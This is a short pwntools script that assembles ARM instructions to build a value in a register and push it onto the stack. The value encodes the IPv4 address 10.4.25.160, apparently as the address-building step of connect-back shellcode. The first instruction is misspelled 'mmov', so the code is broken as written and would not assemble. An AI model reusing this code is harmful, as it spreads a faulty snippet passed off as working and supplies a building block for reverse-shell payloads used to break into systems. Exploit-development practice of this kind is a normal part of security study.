from pwn import *

context.arch='arm'

ip_assembly = asm('''mmov r1,#0xa0
lsl r1,r1,#8
add r1,r1,#25
lsl r1,r1,#8
add r1,r1,#0x04
lsl r1,r1,#8
add r1,r1,#0x05
add r1,r1,#0x05
push {r1}''')

print(ip_assembly)